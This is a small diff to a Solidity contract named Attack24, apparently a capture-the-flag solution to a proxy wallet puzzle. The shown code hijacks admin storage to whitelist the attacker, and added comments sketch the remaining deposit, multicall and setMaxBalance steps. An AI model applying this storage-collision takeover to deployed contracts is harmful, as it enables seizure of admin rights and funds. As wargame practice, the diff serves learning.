@@ -20,6 +20,9 @@ contract Attack24 {
         proxy.proposeNewAdmin(address(this));
         target.addToWhitelist(address(this));
         emit AddedToWhiteList(address(this));
+        // build deposit and multicall   <--  HERE
+        // target.execute();
+        // target.setMaxBalance(); 
      }
 
     function withdraw() public view {
